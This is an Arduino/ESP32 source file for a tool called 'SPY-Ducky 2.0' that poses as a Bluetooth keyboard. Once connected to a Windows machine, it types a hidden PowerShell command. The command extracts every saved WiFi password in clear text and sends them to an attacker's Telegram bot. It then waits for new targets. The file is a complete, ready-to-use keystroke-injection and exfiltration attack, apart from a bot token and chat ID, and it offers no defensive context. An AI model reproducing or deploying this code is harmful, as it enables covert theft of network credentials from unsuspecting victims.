/*
 * PROJECT : SPY-Ducky 2.0 (Telegram Exfiltration)
 * BRAND   : SPY-E & 123Tool
 * AUTHOR  : Rolandino
 */

#include <BleKeyboard.h>

// --- KONFIGURASI TELEGRAM ---
String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
String CHAT_ID = "YOUR_CHAT_ID_HERE";
// ----------------------------

BleKeyboard bleKeyboard("SPY-E Keyboard", "123Tool", 100);

void setup() {
  Serial.begin(115200);
  bleKeyboard.begin();
}

void sendTelegramPayload() {
  // 1. Buka Run (Win + R)
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(200);
  bleKeyboard.releaseAll();
  delay(600);

  // 2. Perintah PowerShell untuk ambil Password WiFi & Kirim ke Telegram
  // Payload ini akan mengambil semua profil WiFi dan mengirimnya via API Telegram
  String payload = "powershell -NoP -NonI -W Hidden -Exec Bypass \"$info = netsh wlan show profiles | Select-String '\\:(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name=$name key=clear }; Invoke-RestMethod -Uri 'https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage' -Method Post -Body @{chat_id='" + CHAT_ID + "'; text=$info}\"";

  bleKeyboard.print(payload);
  delay(200);
  bleKeyboard.write(KEY_RETURN);
}

void loop() {
  if(bleKeyboard.isConnected()) {
    Serial.println("[!] Target Terhubung! Mengirim Payload ke Telegram...");
    delay(2500); 
    
    sendTelegramPayload();
    
    Serial.println("[+] Selesai. Menunggu target baru...");
    delay(60000); // Delay 1 menit agar tidak looping terus di target yang sama
  }
}
